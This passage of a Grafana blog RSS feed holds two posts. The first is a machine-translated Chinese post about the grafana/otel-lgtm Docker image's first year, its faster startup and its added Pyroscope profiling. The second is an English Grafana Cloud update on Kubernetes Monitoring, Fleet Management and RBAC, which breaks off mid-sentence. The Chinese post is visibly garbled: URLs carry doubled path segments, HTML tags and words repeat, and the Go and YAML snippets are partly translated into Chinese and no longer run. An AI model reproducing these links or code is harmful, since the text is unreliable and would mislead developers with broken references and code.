noreferrer”&gt; http：// localhost：3000/&lt;/a&gt;在浏览器中查看指标，日志，痕迹，痕迹和配置文件。&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;您可以阅读有关在此处使用grafana/otel-lgtm的更多信息&#xA;&lt;a href =“/blog/2024/03/13/an-opentelemetry-backend-in-a-docker-image-indroducing-grafana/otel-lgtm/”&gt;公告博客文章&lt;/a&gt; &lt;/a&gt; &lt;/a&gt; &lt;/p&gt;&#xA;&lt;BlockQuote&gt;&#xA;&lt;p&gt; &lt;code&gt; grafana/otel-lgtm &lt;/code&gt; docker映像用于开发，演示和测试。用于生产，请参阅&#xA;&lt;a href =“/products/cloud/cloud/application-observability/？pg = blog＆plcmt = body-txt”&gt; grafana云应用程序可观察性&lt;/a&gt;。&lt;/p&gt; &lt;/blockquote&gt;&#xA;&lt;h2 id =“一年一年”&gt;一年后&lt;/h2&gt;&#xA;&lt;p&gt; &lt;code&gt; grafana/otel-lgtm &lt;/code&gt;使项目更容易创建演示设置以观察到。一些值得注意的采用者包括：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://docs.deno.com/runtime/fundamentals/open_telemetry/” target =“ _ blank” rel =“ noopener noreferrer”&gt; deNo &lt;/a&gt;（javaScript）&lt;/li&gt; &lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://quarkus.io/guides/observiability-devservices-lgtm” target =“ _ blank” rel =“ noopener noreferrer”&gt; quarkus&gt; quarkus &lt;/a&gt;（Java（Java）&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/softwaremill/bootzooka/blob/d4241fd705a287db7504b7504b86b7444444176e26089fbf/docker-compose.compose.yml#l31”目标=el =“ noopener noreferrer”&gt; bootzooka &lt;/a&gt;（scala）&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/roadster-rs/oadster/blob/main/main/book/src/src/features/observability/observability/otel.md#grafana” target =“ _ blank” rel =“ noopener noreferrer”&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/embrace-io/reaect-otel-sample/blob/main/main/backend/grafana.dockerfile” target =“ _空白” rel =“ noopener noreferrer”&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;甚至是&#xA;&lt;a href =“ https://csfoundations.cs.aalto.fi/en/courses/designing-and-building-and-building-scalable-web-applications/part-6/part-6/3-lgtm-stack-----lgtm-stack“ target =” no prom =“ noopener noreferrer”&#xA;&lt;p&gt;非常感谢社区的贡献：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/pull/284” target =“ _ blank” rel =“ noopener noreferrer”&gt; node.js示例&lt;/a&gt;&#xA;&lt;a href =“ https://github.com/ghassenrjab” target =“ _ blank” rel =“ noopener noreferrer”&gt;@ghassenrjab &lt;/a&gt; &lt;/a&gt; &lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/pull/275” target =“ _ blank” rel =“ noopener noreferrer”&gt; powerShell支持&lt;/a&gt;&#xA;&lt;a href =“ https://github.com/tebeco” target =“ _ blank” rel =“ noopener noreferrer”&gt;@tebeco &lt;/a&gt; &lt;/a&gt; &lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/pull/160” target =“ _ blank” rel =“ noopener noreferrer”&gt;在github注册表上发布&lt;/a&gt;&#xA;&lt;a href =“ https://github.com/rajpratik71” target =“ _ blank” rel =“ noopener noreferrer”&gt;@rajpratik71 &lt;/a&gt; &lt;/a&gt; &lt;/li&gt;&#xA;&lt;li&gt;…和每个&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/graphs/contributors” target =“ _ blank” rel =“ noopener noreferrer”&gt; 34个贡献者&lt;/a&gt;&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/pull/160” target =“ _ blank” rel =“ noopener noreferrer”&gt; &lt;/a&gt; &lt;/a&gt; &lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;BlockQuote&gt;&#xA;&lt;p&gt;快速启动时间不仅适合演示和手动故障排除，而且还适用于自动测试。因此，我们创建了&#xA;&lt;a href =“ https://github.com/grafana/oats” target =“ _ blank” rel =“ noopener noreferrer”&gt; oats &lt;/a&gt;，基于Grafana/otel-lgtm的No-Code测试框架，以使用YAML使用YAML来测试您的应用程序。例如：&lt;/p&gt;&#xA;&lt;div class =“ code-snippet code-snippet__mini”&gt; &lt;div class =“ lang-toolbar__mini”&gt;&#xA;&lt;span class =“ code-clipboard”&gt;&#xA;&lt;button x-data =“ app_code_snippet（）” x-init =“ init（）” @click =“ copy（）”&gt;&#xA;&lt;img class =“ code-clipboard__icon” src =“/媒体/images/icons/icon-copy-small-2.svg” alt =“复制代码到剪贴板” width =“ 14”高度=“ 13”&gt;&#xA;&lt;span&gt;复制&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt; &lt;div class =“代码 - 尼珀代码snippet__border”&gt;&#xA;&lt;pre data-expanded =“ false”&gt; &lt;code class =“ language-none”&gt;预期：&#xA;痕迹：&#xA;-traceql：&#39;{span.http.route =“/rolldice/{player？}”}&#39;&#xA;跨度：&#xA; - 名称：“ get /rolldice /{player？}”&#xA;属性：&#xA;otel.library.name：Microsoft.aspnetcore &lt;/code&gt; &lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt; &lt;/blockquote&gt;&#xA;&lt;H2 ID =“ Whats-New”&gt;什么是新的&lt;/h2&gt;&#xA;&lt;p&gt;我们目前要达到0.11.5版本，并且我们已经努力将&lt;code&gt; grafana/otel-lgtm &lt;/code&gt;的多个改进结合起来。这只是SOM自从我们做出的更改以来&#xA;&lt;a href =“/blog/2024/03/13/an-opentelemetry-backend-in-a-docker-image-indroducing-grafana/otel-lgtm/“&gt; 2024年3月的初始版本&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;h3 id =“更快启动时间”&gt;更快的启动时间&lt;/h3&gt;&#xA;&lt;p&gt;最要求的功能是更快的启动。通过这些关键改进，我们将启动时间从〜60秒减少到5秒以下：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;将Prometheus Health检查刮擦间隔从1分钟减少到1秒。&lt;/li&gt;&#xA;&lt;li&gt;使用&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/blob/main/main/docker/otelcol-config.yaml” target =“ _ black” rel =“ noopener noreferrer”&#xA;&lt;li&gt;优化DNS查找和准备就绪的数据库配置。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;这些更改是针对快速启动而不是高可扩展性的优化的。&lt;/p&gt;&#xA;在&#xA;&lt;p&gt;分析是&#xA;&lt;a href =“ https://opentelemetry.io/blog/2024/state-profling/” target =“ _ blank” rel =“ noopener noreferrer”&gt;最新的opentelemetry Signal &lt;/a&gt;，我们添加了&#xA;&lt;a href =“ https://github.com/grafana/pyroscope” target =“ _ blank” rel =“ noopener noreferrer”&gt; grafana pyroscope &lt;/a&gt;作为第四个数据库。分析可帮助您了解代码的哪些部分消耗最多的资源（例如CPU时间或内存）。这对于识别性能瓶颈和优化您的应用程序至关重要。这使您可以无缝融合轨迹和配置文件来优化关键路径。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1999px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/grafana-otel-lgtm/pyroscope-flame-graph.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/博客/grafana-otel-lgtm/pyroscope-flame-graph.png” data-srcset =“/媒体/blog/grafana-otel-lgtm/pycoscope-flame-graph.png？ 550W，/media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=750 750W，/media/Blog/grafana-otel-otel-lgtm/pyroscope-flame-flame-graph.png.png？w=900 900w， /Media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=1040 1040W，/media/Blog/grafana-otel-tel-lgtm/pyroscope-flame-grame-graph.png？ /Media/blog/grafana-otel-lgtm/pyroscope-flame-graph.png?w=1920W = 1920W“&#xA;data-sizes =“ auto” alt =“ grafana pyrospope flame图”宽度=“ 1999”高度=“ 1045”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/grafana-otel-lgtm/pyroscope-flame-graph.png”&#xA;alt =“ grafana pyrospope flame graph” width =“ 1999”高度=“ 1045”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;尝试&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-otel-lgtm/tree/main/main/examples/ebpf-profiler” target =“ _ blank” rel =“ noopener noreferrer”&#xA;&lt;ol&gt;&#xA;&lt;li&gt;更改为示例目录：&lt;code&gt; CD示例/EBPF-PROFILER &lt;/code&gt; &lt;/li&gt;&#xA;&lt;li&gt;启动堆栈：&lt;code&gt; Docker组成 - -eRemove-orphans  - 建造&lt;/code&gt; &lt;/li&gt;&#xA;&lt;li&gt;打开&#xA;&lt;a href =“ http：// localhost：3000/a/grafana-pyroscope-app/explore” target =“ _ blank” rel =“ noopener noreferrer”&gt; profiles drilldown drilldown &lt;/a&gt;在grafana中。&lt;/li&gt;&#xA;&lt;li&gt;通过&lt;code&gt; process_executable_name = rolldice &lt;/code&gt; explore &lt;/code&gt;并探索火焰图。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;BlockQuote&gt;&#xA;&lt;p&gt;配置文件钻对提供了一个直观的接口，用于探索您的个人资料数据以查看服务性能，优化过程和诊断问题。&#xA;&lt;a href =“/docs/grafana/最终/探索/简化 - 探索/propiles/？pg = blog＆plcmt = body-txt”&gt;在这里了解更多信息&lt;/a&gt;。&lt;/p&gt; &lt;/blockquote&gt;&#xA;&lt;p&gt;在上面的示例火焰图中，我们可以看到“ rolldice”需要1.2秒才能完成。其中，在“滚动”功能中花费了1.15秒，这又是由GO标准库中的“自来”函数引起的。因为“因为”应该是快速的，所以最好查看此特定的代码，在这种情况下，该代码是故意使演示目的放慢速度。 &lt;/p&gt;&#xA;&lt;div class =“ code-snippet code-snippet__mini”&gt; &lt;div class =“ lang-toolbar__mini”&gt;&#xA;&lt;span class =“ code-clipboard”&gt;&#xA;&lt;button x-data =“ app_code_snippet（）” x-init =“ init（）” @click =“ copy（）”&gt;&#xA;&lt;img class =“ code-clipboard__icon” src =“/媒体/images/icons/icon-copy-small-2.svg” alt =“复制代码到剪贴板” width =“ 14”高度=“ 13”&gt;&#xA;&lt;span&gt;复制&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt; &lt;div class =“代码 - 尼珀代码snippet__border”&gt;&#xA;&lt;pre data-expanded =“ false”&gt; &lt;code class =“ language-none”&gt; start：= time.now（）&#xA;时间.since（start）&lt;1*时间。&#xA;//忙着等待&#xA;} &lt;/code&gt; &lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt; &lt;h2 id =“ get-started-today”&gt;立即开始&lt;/h2&gt;&#xA;&lt;p&gt; Grafana Labs仍然致力于OpenTelemetry项目，不断增强&lt;code&gt; Grafana/Otel-LGTM &lt;/code&gt;和其他工具，以使用户在其可观察性旅程中授权。&lt;/p&gt;&#xA;&lt;p&gt;尝试&#xA;&lt;a href =“ https://github.com/grafana/docker-otel-lgtm/” target =“ _ blank” rel =“ noopener noreferrer”&gt; &lt;code&gt; &lt;code&gt; &lt;code&gt; grafana/docker-otel-otel-lgtm &lt;/code &lt;/code&gt;而且，如果您想帮助该项目发展，请随时跳入并立即开始贡献！&lt;/p&gt;&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana cloud &lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“//auth/ign-up/create-user/？pg = blog＆plcmt = body-txt”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Tue, 08 Jul 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【Grafana Cloud updates: The latest features in Kubernetes Monitoring, Fleet Management, and more】Grafana云更新：Kubernetes监视，车队管理等的最新功能</title>
      <link>https://grafana.com/blog/2025/06/25/grafana-cloud-updates-the-latest-features-in-kubernetes-monitoring-fleet-management-and-more/</link>
      <description>【&lt;p&gt;We consistently roll out helpful updates and fun features in Grafana Cloud, our fully managed observability platform powered by the open source Grafana LGTM Stack (&#xA;&lt;a href=&#34;/oss/loki/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Loki&lt;/a&gt; for logs,&#xA;&lt;a href=&#34;/oss/grafana/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana&lt;/a&gt; for visualization,&#xA;&lt;a href=&#34;/oss/tempo/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Tempo&lt;/a&gt; for traces, and&#xA;&lt;a href=&#34;/oss/mimir/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Mimir&lt;/a&gt; for metrics).&lt;/p&gt;&#xA;&lt;p&gt;In case you missed them, here’s our monthly round-up of the latest and greatest Grafana Cloud updates. You can also read about all the features we add to Grafana Cloud in our&#xA;&lt;a href=&#34;/docs/grafana-cloud/whats-new/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;What’s New in Grafana Cloud documentation&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;And if you’re not a Grafana Cloud user yet,&#xA;&lt;a href=&#34;/auth/sign-up/create-user/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;sign up&lt;/a&gt; for an account today! You can try any of these features (and more) for free with our generous Cloud Free plan.&lt;/p&gt;&#xA;&lt;h2 id=&#34;deeper-insights-in-kubernetes-monitoring&#34;&gt;Deeper insights in Kubernetes Monitoring&lt;/h2&gt;&#xA;&lt;p&gt;Our&#xA;&lt;a href=&#34;/solutions/kubernetes/?pg=blog&amp;amp;plcmt=body-txt/&#34;&gt;Kubernetes Monitoring&lt;/a&gt; solution in Grafana Cloud enables you to visualize and alert on your Kubernetes cluster so you can identify root causes, optimize resource usage, and reduce costs. This month, we’ve added new features to streamline navigation and troubleshooting.&lt;/p&gt;&#xA;&lt;h3 id=&#34;quickly-find-logs-events-and-non-standard-workloads&#34;&gt;Quickly find logs, events, and non-standard workloads &lt;/h3&gt;&#xA;&lt;p&gt;From any detail page, click the &lt;strong&gt;Logs &amp;amp; Events&lt;/strong&gt; tab to easily find the logs and events for that particular Kubernetes object. You can filter for several dimensions, including:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Time period&lt;/li&gt;&#xA;&lt;li&gt;Component&lt;/li&gt;&#xA;&lt;li&gt;Cloud region&lt;/li&gt;&#xA;&lt;li&gt;Error level&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/docs/grafana-cloud/k8s/logs-table-cluster.png?w=1920&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/docs/grafana-cloud/k8s/logs-table-cluster.png?w=1920&#34;alt=&#34;A screenshot of a logs table for a Kubernetes cluster.&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/docs/grafana-cloud/k8s/logs-table-cluster.png?w=1920&#34;&#xA;alt=&#34;A screenshot of a logs table for a Kubernetes cluster.&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;Additionally, you can now use filters on the Workloads main page to quickly find&#xA;&lt;a href=&#34;/docs/grafana-cloud/monitor-infrastructure/kubernetes-monitoring/navigate-k8s-monitoring/#discover-non-standard-workloads&#34;&gt;non-standard workloads&lt;/a&gt;. Filters for these non-standard workloads include:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Argo Rollouts&lt;/li&gt;&#xA;&lt;li&gt;Strimzi Pod sets&lt;/li&gt;&#xA;&lt;li&gt;Unmanaged (or static) Pods&lt;/li&gt;&#xA;&lt;li&gt;CronJobs&lt;/li&gt;&#xA;&lt;li&gt;Bare Pods&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 670px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/docs/grafana-cloud/k8s/workload-type-sort.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/docs/grafana-cloud/k8s/workload-type-sort.png&#34;data-srcset=&#34;/media/docs/grafana-cloud/k8s/workload-type-sort.png?w=320 320w, /media/docs/grafana-cloud/k8s/workload-type-sort.png?w=550 550w, /media/docs/grafana-cloud/k8s/workload-type-sort.png?w=750 750w, /media/docs/grafana-cloud/k8s/workload-type-sort.png?w=900 900w, /media/docs/grafana-cloud/k8s/workload-type-sort.png?w=1040 1040w, /media/docs/grafana-cloud/k8s/workload-type-sort.png?w=1240 1240w, /media/docs/grafana-cloud/k8s/workload-type-sort.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A screenshot of a filter for non-standard workloads.&#34;width=&#34;670&#34;height=&#34;802&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/docs/grafana-cloud/k8s/workload-type-sort.png&#34;&#xA;alt=&#34;A screenshot of a filter for non-standard workloads.&#34;width=&#34;670&#34;height=&#34;802&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h3 id=&#34;troubleshoot-faster-with-memory-and-cpu-tabs&#34;&gt;Troubleshoot faster with memory and CPU tabs &lt;/h3&gt;&#xA;&lt;p&gt;On any detail page in Kubernetes Monitoring, you can see an overview of CPU and memory usage. You can also now click the &lt;strong&gt;Memory&lt;/strong&gt; or &lt;strong&gt;CPU&lt;/strong&gt; &lt;strong&gt;tab&lt;/strong&gt; to view more correlated usage information. &lt;/p&gt;&#xA;&lt;p&gt;The Memory tab and its panels are accessible on any detail page beyond the container level. Now you can view memory usage alongside other relevant data points to understand, for example, which workloads contribute the most to the namespace’s memory usage.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/docs/grafana-cloud/k8s/workspace-memory-panels.png?w=1920&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/docs/grafana-cloud/k8s/workspace-memory-panels.png?w=1920&#34;alt=&#34;A screenshot of memory usage panels in Kubernetes Monitoring.&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/docs/grafana-cloud/k8s/workspace-memory-panels.png?w=1920&#34;&#xA;alt=&#34;A screenshot of memory usage panels in Kubernetes Monitoring.&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;The CPU tab, meanwhile, offers insightful panels on every detail page beyond the container page to enable faster troubleshooting and better resource planning. You can gain deeper visibility, from cluster to pod, with utilization efficiency graphs and CPU distribution analysis.&lt;/p&gt;&#xA;&lt;p&gt;For example, you can use the CPU tab to gain capacity-sizing insights to optimize performance.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 2074px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/docs/grafana-cloud/k8s/cputab.gif&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/docs/grafana-cloud/k8s/cputab.gif&#34;alt=&#34;A GIF showing the CPU tab.&#34;width=&#34;2074&#34;height=&#34;1656&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/docs/grafana-cloud/k8s/cputab.gif&#34;&#xA;alt=&#34;A GIF showing the CPU tab.&#34;width=&#34;2074&#34;height=&#34;1656&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;You can learn more about the CPU and memory tabs in our&#xA;&lt;a href=&#34;/docs/grafana-cloud/monitor-infrastructure/kubernetes-monitoring/navigate-k8s-monitoring/?pg=blog&amp;amp;plcmt=body-txt/#cpu-and-memory-tabs&#34;&gt;Kubernetes Monitoring documentation&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;new-features-in-grafana-fleet-management&#34;&gt;New features in Grafana Fleet Management &lt;/h2&gt;&#xA;&lt;p&gt;In&#xA;&lt;a href=&#34;/docs/grafana-cloud/send-data/fleet-management/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Fleet Management&lt;/a&gt;, a Grafana Cloud solution that enables you to manage collector deployments at scale, we’ve rolled out a couple new features related to restoring and reusing pipelines.&lt;/p&gt;&#xA;&lt;h3 id=&#34;restore-pipeline-versions&#34;&gt;Restore pipeline versions &lt;/h3&gt;&#xA;&lt;p&gt;The&#xA;&lt;a href=&#34;/docs/grafana-cloud/send-data/fleet-management/manage-fleet/pipelines/view-pipeline-history/&#34;&gt;pipeline history&lt;/a&gt; feature in Fleet Management now provides an option to restore versions of existing configuration pipelines. From the &lt;strong&gt;History details&lt;/strong&gt; page, choose a version and click &lt;strong&gt;Restore&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Here’s how it works:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Restoring a pipeline version overwrites the configuration of the current pipeline.&lt;/li&gt;&#xA;&lt;li&gt;A restored pipeline is set to the same Active or Inactive state as the pipeline it overwrites.&lt;/li&gt;&#xA;&lt;li&gt;When a pipeline version is restored, its matching attributes can also be restored, or the matching attributes from the overwritten pipeline can be persisted in the restored version.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1999px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png&#34;data-srcset=&#34;/media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=320 320w, /media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=550 550w, /media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=750 750w, /media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=900 900w, /media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=1040 1040w, /media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=1240 1240w, /media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;A screenshot of the restore pipelines feature in Fleet Management.&#34;width=&#34;1999&#34;height=&#34;1087&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/grafana-cloud-updates-june-2025/restore-pipelines-fleet-management.png&#34;&#xA;alt=&#34;A screenshot of the restore pipelines feature in Fleet Management.&#34;width=&#34;1999&#34;height=&#34;1087&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h3 id=&#34;reusable-pipeline-components&#34;&gt;Reusable pipeline components &lt;/h3&gt;&#xA;&lt;p&gt;Pipelines in Grafana Fleet Management can now leverage the&#xA;&lt;a href=&#34;/oss/alloy-opentelemetry-collector/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Alloy&lt;/a&gt; &lt;code&gt;export&lt;/code&gt; block to share their components with other pipelines. &lt;/p&gt;&#xA;&lt;p&gt;With&#xA;&lt;a href=&#34;/docs/grafana-cloud/send-data/fleet-management/set-up/configuration-pipelines/pipeline-export-injection/&#34;&gt;pipeline export injection&lt;/a&gt;, you can export components from one configuration pipeline and inject them into another using the syntax &lt;code&gt;argument.pipeline_exports.value[&amp;quot;PIPELINE_NAME&amp;quot;][&amp;quot;EXPORT_NAME&amp;quot;]&lt;/code&gt;. This powerful feature enables you to create dynamic configurations that adapt to each pipeline’s exported values, allowing for flexible and reusable pipeline configurations.&lt;/p&gt;&#xA;&lt;p&gt;You can learn more in our&#xA;&lt;a href=&#34;/docs/grafana-cloud/send-data/fleet-management/manage-fleet/pipelines/view-pipeline-history/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Fleet Management technical docs&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;rbac-in-synthetic-monitoring&#34;&gt;RBAC in Synthetic Monitoring &lt;/h2&gt;&#xA;&lt;p&gt;Now generally available, RBAC within&#xA;&lt;a href=&#34;/products/cloud/synthetic-monitoring/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Grafana Cloud Synthetic Monitoring&lt;/a&gt; allows you to fine-tune access and permissions, so you have greater control over who can access specific features. You can assign different roles and permissions to users and teams, ensuring the right people have the right access. &lt;/p&gt;&#xA;&lt;p&gt;This makes managing your monitoring workflows more secure and flexible.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/docs/synthetic-monitoring/rbac1.png?w=1240&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/docs/synthetic-monitoring/rbac1.png?w=1240&#34;alt=&#34;A screenshot of RBAC configurations in Synthetic Monitoring.&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/docs/synthetic-monitoring/rbac1.png?w=1240&#34;&#xA;alt=&#34;A screenshot of RBAC configurations in Synthetic Monitoring.&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;To learn more about how to assign roles in Synthetic Monitoring, please check out our&#xA;&lt;a href=&#34;/docs/grafana/latest/administration/roles-and-permissions/access-control/assign-rbac-roles/?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;documentation&lt;/a&gt;. &lt;/p&gt;&#xA;&lt;h2 id=&#34;early-detection-patterns-for-adaptive-logs&#34;&gt;Early detection patterns for Adaptive Logs&lt;/h2&gt;&#xA;&lt;p&gt;&#xA;&lt;a href=&#34;/docs/grafana-cloud/cost-management-and-billing/adaptive-telemetry/adaptive-logs//?pg=blog&amp;amp;plcmt=body-txt&#34;&gt;Adaptive Logs&lt;/a&gt; is a Grafana Cloud feature that uses AI/ML techniques to analyze observability data at scale and identify commonly 